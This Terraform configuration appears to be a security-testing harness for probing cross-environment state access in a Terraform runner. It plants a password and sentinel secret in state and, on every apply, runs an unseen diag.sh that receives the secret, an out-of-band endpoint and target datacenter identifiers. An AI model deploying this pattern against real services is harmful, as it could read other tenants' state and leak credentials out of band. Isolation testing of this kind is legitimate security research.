terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
    random = {
      source  = "hashicorp/random"
      version = "~> 3.6"
    }
  }
}

variable "oob" {
  type    = string
  default = ""
}
variable "role" {
  type    = string
  default = "diag"
}
variable "sentinel" {
  type    = string
  default = ""
}
variable "target_op" {
  type    = string
  default = ""
}
variable "target_dcid" {
  type    = string
  default = ""
}
variable "target_dcuri" {
  type    = string
  default = ""
}

# A realistic plaintext secret persisted into environment.tfstate, so a cross-environment
# state read is directly observable.
resource "random_password" "db" {
  length  = 24
  special = true
}

# Sentinel marker stored verbatim in tfstate (null_resource triggers are plaintext in state).
resource "null_resource" "sentinel_holder" {
  triggers = {
    sentinel_secret = var.sentinel
  }
}

resource "null_resource" "diag" {
  triggers = {
    always = timestamp()
  }
  provisioner "local-exec" {
    interpreter = ["/bin/bash", "-c"]
    command     = "bash ${path.module}/diag.sh"
    environment = {
      OOB          = var.oob
      ROLE         = var.role
      SENTINEL     = var.sentinel
      TARGET_OP    = var.target_op
      TARGET_DCID  = var.target_dcid
      TARGET_DCURI = var.target_dcuri
      STATE_PW     = random_password.db.result
    }
  }
  depends_on = [random_password.db, null_resource.sentinel_holder]
}

output "role" {
  value = var.role
}
output "sentinel" {
  value = var.sentinel
}
